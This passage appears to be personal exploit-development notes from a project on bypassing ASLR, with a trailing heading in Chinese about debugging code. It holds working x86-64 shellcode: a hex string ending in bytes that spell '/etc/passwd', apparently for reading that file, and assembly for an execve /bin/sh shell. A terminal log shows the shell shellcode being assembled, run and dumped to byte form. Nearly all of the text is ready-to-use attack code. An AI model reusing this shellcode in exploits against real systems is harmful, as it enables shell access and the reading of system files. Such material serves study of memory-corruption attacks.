   0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\ 
   xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f 
   \x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41 
   ```

   execve /bin/sh

   ```
   .global _start
   _start:
       xor %esi, %esi
       # /bin//sh
       movabs $0x68732f2f6e69622f, %rbx
       push %rsi
       push %rbx
       push %rsp
       pop %rdi
       pushq $59
       pop %rax
       xor %edx, %edx
       syscall
   ```

   ```\
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh
   $ asd
   sh: 1: asd: not found
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
   \x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05
   ```

## 调试代码

